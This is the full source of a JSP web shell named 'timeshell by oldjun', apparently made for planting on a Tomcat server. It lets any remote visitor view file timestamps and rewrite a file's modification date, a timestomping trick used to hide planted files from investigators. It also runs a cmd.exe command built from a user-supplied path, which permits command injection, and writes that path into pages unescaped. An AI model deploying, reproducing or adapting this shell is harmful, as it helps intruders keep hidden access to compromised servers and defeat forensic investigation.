<%@ page import="java.io.*" %>   
<%@ page import="java.util.*, java.text.*" %>   
<%@ page language="java" import="java.util.Enumeration" contentType="text/html; charset=GB2312"%>   

<html>   
<head>   
<title>JSP timeshell by oldjun</title>   
<meta http-equiv="Content-Type" content="text/html; charset=gb2312"></head>   
<body>   
<H1>JSP timeshell by oldjun</H1>   
<%!   
public static String getFileCreateDate(File _file) {   
        File file = _file;   
        try {   
            Process ls_proc = Runtime.getRuntime().exec("cmd.exe /c dir \"" + file.getAbsolutePath() + "\" /tc");   
            BufferedReader br = new BufferedReader(new InputStreamReader(ls_proc.getInputStream()));   
            for (int i = 0; i < 5; i++) {   
                br.readLine();   
            }   
            String stuff = br.readLine();   
            StringTokenizer st = new StringTokenizer(stuff);   
            String dateC = st.nextToken();   
            String time = st.nextToken();   
            String datetime = dateC.concat(" "+time);   
            br.close();   
            return datetime;   
        } catch (Exception e) {   
            return null;   
        }   
    }   
String folderReplace(String folder){   
    return folder.replace('\\','/');   
}   
%>                                                                       
<%   
String action = null;   
if (request.getParameter("action") == null)   
        action = "main";   
    else   
        action = (String)request.getParameter("action");   
if (action.equals("main")) {   
%>   
<form name= form1 method="post" action="?action=getinfo">   
filepath:<input name="file" type="text" size="100" /><br>(for instance C:/Program Files/Apache Software Foundation/Tomcat 6.0/webapps/ROOT/time.jsp)<br>   
<input type="submit" name="Button" value="getinfo"/>   
</form>   
<%   
}else if (action.equals("getinfo")) {   
String filepath = folderReplace(request.getParameter("file"));   
File file = new File(filepath);   
if(!file.exists()){   
        out.println("<script lanugage=\"javascript\">alert(\"file:"+filepath+" not find!\");history.back();</script>");     
    }   
%>   
filepath:<br>   
<%=filepath%><br><br>   
lastModifiedtime:<br>   
<%=new Date(file.lastModified())%><br><br>   
Createtime:<br>   
<%   
String Createtime=getFileCreateDate(file);   
out.println(Createtime);   
%><br><br>   
now:<br>   
<%   
Date myDate = new Date();   
out.println(myDate.toLocaleString());   
%>   
<form name= form2 method="post" action="?action=change">   
<input name="year" type="text" size="10"/>year   
<input name="month" type="text" size="10"/>month   
<input name="day" type="text" size="10"/>day   
<input name="hour" type="text" size="10"/>hour   
<input name="min" type="text" size="10"/>minute   
<input name="sec" type="text" size="10"/>second   
<input name="file" type="hidden" value="<%=filepath%>" /><br>   
<input type="submit" name="Button" value="change"/>   
</form>   
<%   
}else if (action.equals("change")) {   
String url="?action=main";   
String filepath = folderReplace(request.getParameter("file"));   
String year = request.getParameter("year");   
String month = request.getParameter("month");   
String day = request.getParameter("day");   
String hour = request.getParameter("hour");   
String min = request.getParameter("min");   
String sec = request.getParameter("sec");   
File file = new File(filepath);   
Calendar calendar=Calendar.getInstance();   
calendar.set(Integer.parseInt(year),Integer.parseInt(month),Integer.parseInt(day),Integer.parseInt(hour),Integer.parseInt(min),Integer.parseInt(sec));  
if(file.setLastModified(calendar.getTimeInMillis()))   
out.println("<script lanugage=\"javascript\">alert(\"file date change success!\");location.href=\""+url+"\";</script>");   
else 
out.println("<script lanugage=\"javascript\">alert(\"time error!\");history.back();</script>");   
}   
%>   
</body>   
</html> 